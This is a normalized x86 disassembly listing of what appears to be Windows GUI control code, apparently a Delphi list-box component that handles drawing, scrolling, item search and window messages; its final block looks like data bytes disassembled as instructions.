and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x23a ]
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x208 ]
or edx [ esi + eax * 4 ]
xor eax eax
mov al [ ebx + 0x239 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x22c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x224 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x23c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
mov [ edi + 0x4 ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov esi rw-data
mov eax ebx
mov si 0xffc8
call sub_403518
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or eax 0x1
not eax
and [ edi + 0x24 ] eax
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
and [ edi + 0x4 ] 0xff7fffff
or [ edi + 0x8 ] 0x200
sub_447184
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x48 ]
mov edi [ ebx + 0x4c ]
mov eax ebx
call sub_45206c
push 0x14
push edi
push esi
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push 0x0
mov eax ebx
call sub_4550b4
push eax
call SetWindowPos
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax ebx
call sub_446a60
mov eax [ ebx + 0x234 ]
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebx + 0x23c ]
push eax
push 0x1
push 0x192
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
mov dl [ ebx + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
cmp [ ebx + 0x240 ] 0x0
je r-xdata
mov esi [ ebx + 0x240 ]
test esi esi
je r-xdata
mov edx eax
mov eax ebx
call sub_447b4c
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x244 ]
mov eax ebx
call sub_446f70
mov edx [ ebx + 0x248 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov [ ebx + 0x234 ] 0xffffffff
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebx + 0x240 ]
call sub_40d814
sub_447254
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_452450
pop esi
pop ebx
retn
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov esi eax
mov [ ebx + 0x240 ] esi
mov edx [ ebx + 0x218 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x234 ] eax
jmp r-xdata
mov eax ebx
call sub_446de8
mov [ ebx + 0x244 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x248 ] eax
sub_4472d0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax ebx
call sub_452ac8
mov edi [ esi ]
cmp edi 0x201
je r-xdata
mov eax ebx
call sub_44f03c
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_452a34
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
sub_447336
add [ eax ] al
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi edx
mov esi eax
mov ax [ edi + 0x4 ]
call sub_46567c
mov ebx eax
cmp [ esi + 0x5d ] 0x1
jne r-xdata
mov edx edi
mov eax esi
call sub_44ff50
cmp [ esi + 0x5d ] 0x1
jne r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x208 ] 0x0
je r-xdata
test bl 0x1
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_44ef74
test bl 0x4
jne r-xdata
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406e50
mov edx esp
mov cl 0x1
mov eax esi
call sub_446fe0
mov ebp eax
test ebp ebp
jl r-xdata
test bl 0x4
je r-xdata
test bl 0x1
jne r-xdata
mov edx ebp
mov eax esi
call sub_446c88
test al al
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_44ef74
jmp r-xdata
sub_4473d4
push esi
mov esi eax
mov ax [ edx + 0x6 ]
dec ax
je r-xdata
mov eax esi
call sub_44e4c0
mov eax esi
mov si 0xffeb
call sub_403518
pop esi
retn
dec ax
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403518
jmp r-xdata
pop esi
retn
sub_447408
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov [ ebp - 0x18 ] 0xbc2b
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x10 ] eax
mov eax [ edi ]
call sub_4550b4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x58 ] 0x2
mov [ ebp - 0x4c ] 0x1
xor eax eax
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x40 ] eax
mov eax [ edi ]
call sub_4550b4
mov [ ebp - 0x54 ] eax
mov eax [ edi ]
call sub_4550b4
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x28 ] 0xbc2c
mov eax [ edi ]
call sub_4550b4
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x70 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x70 ] 0x2
mov eax [ edi ]
call sub_4550b4
mov [ ebp - 0x6c ] eax
xor esi esi
mov eax [ edi ]
call sub_446de8
mov ebx eax
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call GetClipBox
mov eax [ edi ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
cmp esi [ ebp - 0x4 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x68 ] ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x64 ] eax
mov eax [ edi ]
mov eax [ eax + 0x230 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x50 ] ebx
lea edx [ ebp - 0x28 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov eax [ ebp - 0x60 ]
add eax esi
push eax
lea eax [ ebp - 0x90 ]
push eax
mov ecx [ ebp - 0x64 ]
mov edx esi
xor eax eax
call sub_41766c
push esi
push edi
lea esi [ ebp - 0x90 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea edx [ ebp - 0x18 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
add esi [ ebp - 0x60 ]
inc ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x5c ] eax
cmp esi [ ebp - 0x4 ]
jl r-xdata
sub_447568
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_453244
push ebp
call sub_447408
pop ecx
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_4475ac
push ebx
add esp 0xffffffe0
mov ebx eax
mov [ esp + 0x8 ] 0x201
push esp
call GetCursorPos
lea ecx [ esp + 0x18 ]
mov edx esp
mov eax ebx
call sub_44e3f8
lea eax [ esp + 0x18 ]
call sub_406e64
mov [ esp + 0x10 ] eax
xor eax eax
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x14 ] eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov [ esp + 0x8 ] 0x202
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x20
pop ebx
retn
sub_44760c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_447718
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x252 ] 0x0
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x228 ]
call sub_425670
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp edi eax
jge r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44771f
lea eax [ ebp - 0x8 ]
call sub_404118
retn
mov edx 0x824
mov eax ebx
call sub_450bac
mov [ ebp - 0x4 ] eax
mov eax ebx
mov si 0xffc8
call sub_403518
test al al
jne r-xdata
sub [ ebp - 0x10 ] 0x2
add [ ebp - 0x18 ] 0x2
jmp r-xdata
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_447c30
jmp r-xdata
lea eax [ ebp - 0x8 ]
call sub_404118
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4043d8
push eax
mov eax [ ebp - 0x8 ]
call sub_4045d8
push eax
mov eax [ ebx + 0x228 ]
call sub_425acc
push eax
call DrawTextA
sub_447748
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi [ edx + 0x8 ]
mov bp [ edi + 0x10 ]
mov edx [ edi + 0x18 ]
mov eax [ esi + 0x228 ]
call sub_425b4c
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x228 ]
call sub_4259ec
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x228 ]
call sub_425a08
cmp [ edi + 0x8 ] 0x0
jl r-xdata
cmp [ edi + 0x8 ] 0x0
jl r-xdata
test bp 0x1
je r-xdata
lea edx [ edi + 0x1c ]
mov eax [ esi + 0x228 ]
call sub_425670
push ebp
lea ecx [ edi + 0x1c ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf8 ]
jmp r-xdata
mov eax [ esi + 0x228 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_4252cc
mov eax [ esi + 0x228 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_424b00
xor edx edx
mov eax [ esi + 0x228 ]
call sub_425b4c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ edi + 0x1c ]
push eax
mov eax [ edi + 0x18 ]
push eax
call DrawFocusRect
test bp 0x10
je r-xdata
sub_447804
push ebx
push esi
push edi
mov esi eax
mov edi [ edx + 0x8 ]
mov eax [ esi + 0x230 ]
mov [ edi + 0x10 ] eax
cmp [ esi + 0x238 ] 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ edi + 0x10 ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xfc ]
sub_447834
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4546cc
pop esi
pop ebx
retn
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
mov eax ebx
call sub_452654
sub_447860
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
mov cl 0x1
mov edx edi
mov eax esi
call sub_446cd8
inc edi
dec ebx
jne r-xdata
sub_447898
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_4045d8
push eax
push 0xffffffff
push 0x18f
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4550b4
push eax
call SendMessageA
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_447c78
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax ]
sub al 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x208 ] 0x0
je r-xdata
cmp ebx 0xffffffff
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub al 0x5
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffeb
call sub_403518
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov esi ebx
mov edx esi
mov eax esi
call sub_406e84
push eax
push 0x1
push 0x19b
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4550b4
push eax
call SendMessageA
sub al 0xe
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax ] 0x0
sub_44797c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_447b3c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_454098
mov eax [ ebx ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447b43
lea eax [ ebp - 0x30 ]
mov edx 0x3
call sub_40413c
retn
call GetTickCount
mov edx [ ebx ]
sub eax [ edx + 0x220 ]
cmp eax 0x1f4
jb r-xdata
call GetTickCount
mov edx [ ebx ]
mov [ edx + 0x220 ] eax
mov eax [ ebp - 0x8 ]
mov al [ eax ]
cmp al 0x8
je r-xdata
mov eax [ ebx ]
add eax 0x21c
call sub_404118
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_4043d8
mov edx eax
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_40c740
cmp al 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_4043d8
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_404678
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_4043d8
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_404678
lea eax [ ebp - 0x30 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_404300
mov edx [ ebp - 0x30 ]
mov eax [ ebx ]
add eax 0x21c
call sub_4043e0
jmp r-xdata
push 0x1
push 0x102
push 0x102
mov eax [ ebx ]
call sub_4550b4
push eax
lea eax [ ebp - 0x24 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
xor edx edx
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebx ]
mov si 0xffeb
call sub_403518
push ebp
call sub_447898
pop ecx
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_4043d8
test eax eax
jle r-xdata
mov eax [ ebx ]
push [ eax + 0x21c ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_404300
push [ ebp - 0x28 ]
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0x1c ]
call sub_404300
push [ ebp - 0x2c ]
mov eax [ ebx ]
add eax 0x21c
mov edx 0x3
call sub_404498
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
sub_447b4c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_447c20
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
call sub_403ad0
push 0x0
push esi
push 0x1a7
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
call sub_403ad0
jmp r-xdata
cmp eax 0xfffffffe
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447c27
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40413c
retn
mov [ ebx + 0x214 ] esi
jmp r-xdata
sub_447c50
push ebx
push ecx
cmp [ eax + 0x272 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_447c78
push ebx
cmp [ eax + 0x26a ] 0x0
je r-xdata
or eax 0xffffffff
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
pop ebx
retn
sub_447cb8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_447c9c
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push esi
push 0x194
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
sub_447ce4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_450de0
mov edx 0x79
mov eax esi
call sub_44e070
push 0x3
call GetSystemMetrics
mov edx eax
mov eax esi
call sub_44e094
mov dl 0x1
mov eax esi
call sub_4552e8
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x208 ] 0x0
xor eax eax
mov [ esi + 0x20c ] eax
xor eax eax
mov [ esi + 0x210 ] eax
mov [ esi + 0x214 ] 0x64
mov [ esi + 0x220 ] 0x1
mov [ esi + 0x222 ] 0x1
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_447d9c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_451f40
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_451e6c
xor eax eax
mov al [ ebx + 0x208 ]
mov eax [ eax * 4 + rw-data ]
or [ edi + 0x4 ] eax
cmp [ ebx + 0x208 ] 0x1
jne r-xdata
mov eax ebx
call sub_447edc
test al al
je r-xdata
mov eax ebx
mov si 0xffc8
call sub_403518
test al al
jne r-xdata
mov [ ebx + 0x21c ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
jmp r-xdata
or [ edi + 0x4 ] 0x2
or [ edi + 0x4 ] 0x4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_447e2c
call sub_44e254
mov eax ebx
call sub_45206c
lea edx [ esp + 0x1c ]
mov eax ebx
call sub_44e274
push 0x0
mov eax [ ebx + 0x214 ]
push eax
mov eax [ ebx + 0x210 ]
push eax
push 0x2
mov eax ebx
call sub_4550b4
push eax
call SetScrollRange
mov [ esp ] 0x1c
mov eax [ ebx + 0x218 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x4 ] 0x2
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_4550b4
push eax
call SetScrollInfo
mov eax ebx
call sub_447edc
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_4550b4
push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_4550b4
push eax
call SetScrollPos
jmp r-xdata
add esp 0x2c
pop ebx
retn
sub_447edc
push ebx
mov ebx eax
mov eax ebx
call sub_44eef8
test al al
je r-xdata
mov al 0x1
pop ebx
retn
cmp [ ebx + 0x208 ] 0x1
je r-xdata
xor eax eax
pop ebx
retn
sub_447efc
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] dl
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
call sub_452654
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
sub_447f38
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_44806f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebp - 0x4 ]
jl r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
cmp esi [ ebx + 0x218 ]
jge r-xdata
cmp esi edi
jge r-xdata
mov edi [ ebp - 0x4 ]
cmp edi [ ebp - 0x4 ]
jge r-xdata
mov eax [ ebx + 0x210 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edi esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x210 ] eax
mov [ ebx + 0x214 ] esi
mov eax ebx
call sub_4553b8
test al al
je r-xdata
cmp esi [ ebx + 0x214 ]
je r-xdata
cmp edi [ ebx + 0x20c ]
je r-xdata
cmp edi [ ebx + 0x20c ]
sete al
neg al
sbb eax eax
push eax
push esi
mov eax [ ebp - 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_4550b4
push eax
call SetScrollRange
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448076
lea eax [ ebp - 0x8 ]
call sub_404118
retn
mov [ ebx + 0x20c ] edi
mov eax ebx
call sub_4553b8
test al al
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
mov si 0xffb3
call sub_403518
mov eax ebx
call sub_447edc
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_4550b4
push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_4550b4
push eax
call SetScrollPos
jmp r-xdata
sub_448094
push ebx
add esp 0xffffffe4
mov ebx eax
cmp edx [ ebx + 0x218 ]
je r-xdata
add esp 0x1c
pop ebx
retn
cmp edx [ ebx + 0x214 ]
jg r-xdata
mov [ ebx + 0x218 ] edx
mov [ esp ] 0x1c
mov [ esp + 0x10 ] edx
mov [ esp + 0x4 ] 0x2
mov eax ebx
call sub_4553b8
test al al
je r-xdata
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_4550b4
push eax
call SetScrollInfo
sub_44815c
push ebx
push esi
push edi
add esp 0xffffffe0
mov edi edx
mov ebx eax
mov esi [ ebx + 0x20c ]
xor eax eax
mov al [ edi + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebx + 0x210 ]
cmp esi eax
jge r-xdata
jmp [ eax * 4 + jump_table_448181 ]
mov eax [ ebx + 0x214 ]
cmp esi eax
jle r-xdata
mov esi eax
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
mov [ esp + 0x4 ] 0x1c
mov [ esp + 0x8 ] 0x17
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_4550b4
push eax
call GetScrollInfo
mov esi [ esp + 0x1c ]
mov eax ebx
call sub_447edc
test al al
jne r-xdata
mov esi [ ebx + 0x210 ]
jmp r-xdata
mov esi [ ebx + 0x214 ]
mov [ esp ] esi
mov ecx esp
mov dl [ edi + 0x4 ]
mov eax ebx
mov si 0xffb2
call sub_403518
mov edx [ esp ]
mov eax ebx
call sub_448080
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov esi eax
mov eax [ ebx + 0x214 ]
sub eax esi
mov esi eax
jmp r-xdata
sub_448284
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_4550b4
push eax
mov eax [ ebx + 0x174 ]
push eax
call CallWindowProcA
pop esi
pop ebx
retn
sub_4482b4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4482d9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4482e0
retn
sub_4483e0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45b000
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_44841c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_448441
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448448
retn
sub_4484ec
int 0x84
inc esp
add bh dl
test [ eax + eax - 0x1f ] al
test [ eax + eax - 0x7b ] al
test [ eax + eax - 0x73 ] al
test [ eax + eax - 0x6b ] al
test [ eax + eax - 0x63 ] al
test [ eax + eax - 0x5b ] al
test [ eax + eax - 0x53 ] al
xlat
cmp ch ah
test [ eax + eax + 0x20 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
